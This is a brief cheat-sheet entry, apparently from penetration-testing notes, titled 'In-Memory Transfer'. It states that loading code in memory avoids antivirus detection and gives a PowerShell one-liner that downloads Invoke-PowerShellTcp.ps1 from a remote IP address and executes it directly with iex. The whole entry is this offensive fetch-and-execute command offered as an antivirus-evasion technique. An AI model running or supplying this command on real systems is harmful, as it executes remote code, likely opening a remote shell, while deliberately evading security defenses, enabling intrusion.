# In-Memory Transfer

allows us to be not detected by Anti Virus, can be done in PowerShell very easily.

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.21.156.104:8000/Invoke-PowerShellTcp.ps1');
```
